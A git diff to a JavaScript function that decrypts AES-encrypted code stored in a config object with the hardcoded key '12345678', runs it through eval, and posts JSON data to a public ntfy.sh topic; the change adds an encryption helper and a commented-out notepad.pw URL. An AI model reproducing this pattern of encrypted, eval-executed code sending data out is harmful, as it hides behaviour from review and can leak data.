@@ -26,7 +26,18 @@ async function run(inf) {
                     ret['ret'] = true;
                 }
             } catch (error) { ret['msg'] = `DECRYPT: ERRO`; } return ret
-        }
+        };
+        async function cryptEnc(inf) {
+            let ret = { 'ret': false };
+            try {
+                const res = CryptoJS.AES.encrypt(inf.tex, inf.pas).toString();
+                if (res == '') { ret['msg'] = `ENCRYPT: ERRO`; } else {
+                    ret['res'] = res;
+                    ret['msg'] = `ENCRYPT: OK`;
+                    ret['ret'] = true;
+                }
+            } catch (error) { ret['msg'] = `ENCRYPT: ERRO`; } return ret
+        };
         // ------------------------------------------------------------------------
         const dec1 = await cryptDec({ tex: config['executar.js'], pas: '12345678' })
         const executar = eval(`(${dec1.res})`);
@@ -35,6 +46,7 @@ async function run(inf) {
         const dec2 = await cryptDec({ tex: config['api.js'], pas: '12345678' })
         const api = eval(`(${dec2.res.replace(/export/g, '\/\/export')})`);
         const requisicao = {
+            //url: 'https://notepad.pw/raw/KEeTANbHwbUSqWTFsNab',
             url: 'https://ntfy.sh/OPSEUA', method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: String.raw`${JSON.stringify(z)}`
